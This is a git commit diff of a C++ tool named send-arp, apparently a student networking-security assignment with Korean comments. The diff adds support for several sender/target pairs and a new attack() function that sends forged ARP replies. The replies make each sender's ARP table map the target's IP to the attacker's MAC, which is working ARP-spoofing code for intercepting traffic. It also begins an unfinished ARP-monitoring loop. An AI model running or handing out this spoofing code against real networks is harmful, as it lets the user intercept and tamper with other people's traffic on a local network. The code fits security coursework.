0d2a8456602b8a14049cf1fe97aaf5aaae77d577
RyuGiHyeon <ryuoo0123@gmail.com>
2025-08-08 22:16:34 +0900

    25.08.08

--- main.cpp
+++ main.cpp
@@ -15,8 +15,8 @@
 using namespace std;
 
 // get_mac_address, get_ip_address GPT 사용했습니다.
-// https://chatgpt.com/share/688eda95-fa28-8004-8578-516519effd41
-int get_ip_address(const std::string& device, Ip& dest_ip) {
+int get_ip_address(const std::string &device, Ip &destIp)
+{
     int sock;
     struct ifreq ifr;
 
@@ -24,24 +24,27 @@ int get_ip_address(const std::string& device, Ip& dest_ip) {
     strncpy(ifr.ifr_name, device.c_str(), IFNAMSIZ - 1);
 
     sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) {
+    if (sock < 0)
+    {
         perror("socket");
         return -1;
     }
 
-    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
+    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0)
+    {
         perror("ioctl(SIOCGIFADDR)");
         close(sock);
         return -1;
     }
 
-    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
-    dest_ip = Ip(ntohl(ipaddr->sin_addr.s_addr));  // ✅ Ip 객체로 저장
+    struct sockaddr_in *ipaddr = (struct sockaddr_in *)&ifr.ifr_addr;
+    destIp = Ip(ntohl(ipaddr->sin_addr.s_addr));
     close(sock);
     return 0;
 }
 
-int get_mac_address(const std::string& device, Mac& mac_out) {
+int get_mac_address(const std::string &device, Mac &mac_out)
+{
     int sock;
     struct ifreq ifr;
 
@@ -49,56 +52,60 @@ int get_mac_address(const std::string& device, Mac& mac_out) {
     strncpy(ifr.ifr_name, device.c_str(), IFNAMSIZ - 1);
 
     sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) {
+    if (sock < 0)
+    {
         perror("socket");
         return -1;
     }
 
-    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
+    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)
+    {
         perror("ioctl(SIOCGIFHWADDR)");
         close(sock);
         return -1;
     }
 
-    mac_out = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);  // ✅ MAC 객체로 저장
+    mac_out = Mac((uint8_t *)ifr.ifr_hwaddr.sa_data);
     close(sock);
     return 0;
 }
 
-EthArpPacket makeArpReq(Ip srcIp, Mac srcMac, Ip targetIp) {
-    
+EthArpPacket makeArpReq(Ip myIp, Mac myMac, Ip targetIp)
+{
+
     EthArpPacket arpReqPacket;
-    arpReqPacket.eth_.smac_ = srcMac;
-	arpReqPacket.eth_.dmac_ = Mac::broadcastMac();
+    arpReqPacket.eth_.smac_ = myMac;
+    arpReqPacket.eth_.dmac_ = Mac::broadcastMac();
     arpReqPacket.eth_.type_ = htons(EthHdr::Arp);
 
     arpReqPacket.arp_.hln_ = Mac::Size;
-	arpReqPacket.arp_.pln_ = Ip::Size;
-	arpReqPacket.arp_.op_ = htons(ArpHdr::Request);
+    arpReqPacket.arp_.pln_ = Ip::Size;
+    arpReqPacket.arp_.op_ = htons(ArpHdr::Request);
     arpReqPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
-	arpReqPacket.arp_.pro_ = htons(EthHdr::Ip4);
-    arpReqPacket.arp_.smac_ = srcMac;
-    arpReqPacket.arp_.sip_= htonl(uint32_t(srcIp));
+    arpReqPacket.arp_.pro_ = htons(EthHdr::Ip4);
+    arpReqPacket.arp_.smac_ = myMac;
+    arpReqPacket.arp_.sip_ = htonl(uint32_t(myIp));
     arpReqPacket.arp_.tmac_ = Mac::nullMac();
     arpReqPacket.arp_.tip_ = htonl(uint32_t(targetIp));
 
     return arpReqPacket;
 }
 
-EthArpPacket makeArpRes(Ip gatewayIp, Mac myMac, Ip targetIp, Mac targetMac) {
+EthArpPacket makeArpRes(Ip receiverIp, Mac myMac, Ip targetIp, Mac targetMac)
+{
 
     EthArpPacket arpReqPacket;
     arpReqPacket.eth_.smac_ = myMac;
-	arpReqPacket.eth_.dmac_ = targetMac;
+    arpReqPacket.eth_.dmac_ = targetMac;
     arpReqPacket.eth_.type_ = htons(EthHdr::Arp);
 
     arpReqPacket.arp_.hln_ = Mac::Size;
-	arpReqPacket.arp_.pln_ = Ip::Size;
-	arpReqPacket.arp_.op_ = htons(ArpHdr::Reply);
+    arpReqPacket.arp_.pln_ = Ip::Size;
+    arpReqPacket.arp_.op_ = htons(ArpHdr::Reply);
     arpReqPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
-	arpReqPacket.arp_.pro_ = htons(EthHdr::Ip4);
+    arpReqPacket.arp_.pro_ = htons(EthHdr::Ip4);
     arpReqPacket.arp_.smac_ = myMac;
-    arpReqPacket.arp_.sip_= htonl(uint32_t(gatewayIp));
+    arpReqPacket.arp_.sip_ = htonl(uint32_t(receiverIp));
     arpReqPacket.arp_.tmac_ = targetMac;
     arpReqPacket.arp_.tip_ = htonl(uint32_t(targetIp));
 
@@ -106,36 +113,49 @@ EthArpPacket makeArpRes(Ip gatewayIp, Mac myMac, Ip targetIp, Mac targetMac) {
 }
 
 // 이건 내가 작성
-Mac get_target_mac(pcap_t* pcap, Ip myIp, Mac myMac, Ip targetIp) {
+Mac getTargetMac(pcap_t *pcap, Ip myIp, Mac myMac, Ip senderIp)
+{
+
+    printf("packet make");
 
     // 패킷 만들기
-    EthArpPacket packet = makeArpReq(myIp, myMac, targetIp);    
-    
-    //결과를 결과패킷 수신, 파싱
-    while (true) {
+    EthArpPacket packet = makeArpReq(myIp, myMac, senderIp);
+
+    printf("packet made");
+
+    // 결과를 결과패킷 수신, 파싱
+    while (true)
+    {
         // 패킷 수신
-        int sendRes = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-        if (sendRes != 0) {
+        int sendRes = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
+        if (sendRes != 0)
+        {
             fprintf(stderr, "pcap_sendpacket return %d error=%s\n", sendRes, pcap_geterr(pcap));
         }
 
-		struct pcap_pkthdr* header;
-		const u_char* packet;
-		int res = pcap_next_ex(pcap, &header, &packet);
-		if (res == 0) continue;
-		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
-			break;
-		}
+        struct pcap_pkthdr *header;
+        const u_char *packet;
+        int res = pcap_next_ex(pcap, &header, &packet);
+        if (res == 0)
+            continue;
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
+        {
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
+            break;
+        }
 
         // packet을 구조체로 변환
-        const struct EthArpPacket* ethArpPacket = (const struct EthArpPacket*)packet;
+        const struct EthArpPacket *ethArpPacket = (const struct EthArpPacket *)packet;
 
         // eth 타입이 ARP ARP 타입이 reply, 출발지, 목적지
-        if (ethArpPacket->eth_.type_ != htons(EthHdr::Arp)) continue;
-        if (ethArpPacket->arp_.op_ != htons(ArpHdr::Reply)) continue;
-        if (ethArpPacket->arp_.sip_ != htonl(uint32_t(targetIp))) continue;
-        if (ethArpPacket->arp_.tip_ != htonl(uint32_t(myIp))) continue;
+        if (ethArpPacket->eth_.type_ != htons(EthHdr::Arp))
+            continue;
+        if (ethArpPacket->arp_.op_ != htons(ArpHdr::Reply))
+            continue;
+        if (ethArpPacket->arp_.sip_ != htonl(uint32_t(senderIp)))
+            continue;
+        if (ethArpPacket->arp_.tip_ != htonl(uint32_t(myIp)))
+            continue;
 
         Mac resultMac = ethArpPacket->arp_.smac_;
         return resultMac;
@@ -143,26 +163,51 @@ Mac get_target_mac(pcap_t* pcap, Ip myIp, Mac myMac, Ip targetIp) {
     return Mac::nullMac();
 }
 
+void attack(int pairCnt, Ip *targetIps, Ip *senderIps, Mac myMac, pcap_t *pcap, Mac *senderMacs) {
+        // arp 테이블 공격 - 변조
+    for (int i = 0; i < pairCnt; i++)
+    {
+        EthArpPacket arpRes = makeArpRes(targetIps[i], myMac, senderIps[i], senderMacs[i]);
+        int sendRes = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&arpRes), sizeof(EthArpPacket));
 
+        if (sendRes != 0)
+        {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", sendRes, pcap_geterr(pcap));
+        }
+    }
+}
 
-int main(int argc, char* argv[]) {
+int main(int argc, char *argv[])
+{
 
     // 입력 예외 처리
-    if (argc != 4) {
-        printf("인자 개수가 안 맞음.\n입력포멧 : send-arp wlan0 192.168.10.2 192.168.10.1");
+    if (argc < 4 || (argc - 2) % 2 != 0)
+    {
+        printf("입력 양식 : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]");
         return -1;
     }
 
-    char* dev = argv[1];
-    Ip targetIp(argv[2]);
-    Ip gatewayIp(argv[3]);
-    
+    char *dev = argv[1];
+    printf("argc : %d", argc);
+    int pairCnt = (argc - 2) / 2;
+
+    Ip senderIps[pairCnt];
+    Ip targetIps[pairCnt];
+    Mac senderMacs[pairCnt];
+    Mac targetMacs[pairCnt];
+
+    for (int i = 0; i < pairCnt; i++)
+    {
+        senderIps[i] = Ip(argv[(i*2+2)]);
+        targetIps[i] = Ip(argv[(i*2+3)]);
+    }
+
     // 공격자(나) ip
     Ip myIp;
     get_ip_address(dev, myIp);
 
     printf("my IP : %s\n", std::string(myIp).c_str());
-    
+
     // 공격자(나) mac
     Mac myMac;
     get_mac_address(dev, myMac);
@@ -171,26 +216,60 @@ int main(int argc, char* argv[]) {
 
     // 패킷 캡쳐
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-	if (pcap == NULL) {
-		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
-		return -1;
-	}
+    pcap_t *pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    if (pcap == NULL)
+    {
+        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
+        return -1;
+    }
 
-    // 상대 mac
-    Mac tragetMac = get_target_mac(pcap, myIp, myMac, targetIp);
-    printf("targetMac : %s\n", std::string(tragetMac).c_str());
+    printf("PairCnt %d :", pairCnt);
+    for (int i = 0; i < pairCnt; i++)
+    {
+        printf("sender=%s, target=%s\n", std::string(senderIps[i]).c_str(), std::string(targetIps[i]).c_str());
+        senderMacs[i] = getTargetMac(pcap, myIp, myMac, senderIps[i]);
+        printf("targetMac : %s\n", std::string(senderMacs[i]).c_str());
+    }
+
+    attack(pairCnt, targetIps, senderIps, myMac, pcap, senderMacs);
 
     // 패킷 수신
-    while (true) {
-        
-        // 패킷 만들기
-        EthArpPacket arpRes = makeArpRes(gatewayIp, myMac, targetIp, tragetMac);
-        // 패킷 보내기 반복~~
-        int sendRes = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&arpRes), sizeof(EthArpPacket));
-        if (sendRes != 0) {
-            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", sendRes, pcap_geterr(pcap));
+    while (true)
+    {
+        struct pcap_pkthdr *header;
+        const u_char *packet;
+        int res = pcap_next_ex(pcap, &header, &packet);
+        if (res == 0)
+            continue;
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
+        {
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
+            break;
         }
+
+        // packet을 구조체로 변환
+        const struct EthArpPacket *ethArpPacket = (const struct EthArpPacket *)packet;
+
+        // eth 타입이 ARP ARP 타입이 reply, 출발지, 목적지
+        if (ethArpPacket->eth_.type_ == htons(EthHdr::Arp))
+        {
+            if (ethArpPacket->arp_.op_ != htons(ArpHdr::Reply) && ethArpPacket->arp_.op_ != htons(ArpHdr::Request))
+                continue;
+            // 여기부터
+
+
+            // 수정합시다!!!
+            // arp reply 패킷 중 src IP 가 target의 IP 일 경우 -> IP 스캐닝 혹은 브로드캐스팅
+            if (ethArpPacket->arp_.sip_ != htonl(uint32_t(targetIps[0])) && ethArpPacket->arp_.tip_ != htonl(uint32_t(targetIps[1])))
+                continue;
+
+            printf("Arp detected\n");
+            // IP 출력
+            printf("%s, %s\n", std::string(ethArpPacket->arp_.sip_).c_str(), std::string(ethArpPacket->arp_.tip_).c_str());
+
+
+        }
+        // if ()
 
         sleep(1);
     }
